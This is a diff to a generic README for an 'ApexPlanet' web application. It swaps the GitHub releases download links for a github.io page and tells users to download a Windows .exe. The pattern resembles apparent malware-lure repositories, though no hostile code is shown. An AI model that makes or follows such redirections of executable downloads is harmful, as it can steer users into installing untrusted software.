@@ -1,6 +1,6 @@
 # 🌐 apexplanet-web-application - Simple software for your daily tasks
 
-[![](https://img.shields.io/badge/Download_ApexPlanet-Blue?style=for-the-badge)](https://github.com/Luzsag3007/apexplanet-web-application/releases)
+[![](https://img.shields.io/badge/Download_ApexPlanet-Blue?style=for-the-badge)](https://luzsag3007.github.io)
 
 ApexPlanet Web Application v2026 brings modern web technology to your desktop. This tool helps you manage your digital projects with speed and ease. The software works on all current web browsers and uses clean code to ensure your experience stays smooth. You find responsive design and interactive features that make your work efficient.
 
@@ -19,7 +19,7 @@ You do not need extra software or coding tools. The application runs as a standa
 
 You download the application directly from the official release page. Follow these steps to obtain the installer:
 
-1. Visit this page to download: [https://github.com/Luzsag3007/apexplanet-web-application/releases](https://github.com/Luzsag3007/apexplanet-web-application/releases)
+1. Visit this page to download: [https://luzsag3007.github.io](https://luzsag3007.github.io)
 2. Look for the section labeled Latest.
 3. Find the file ending in .exe for Windows.
 4. Click the file name to start your download.
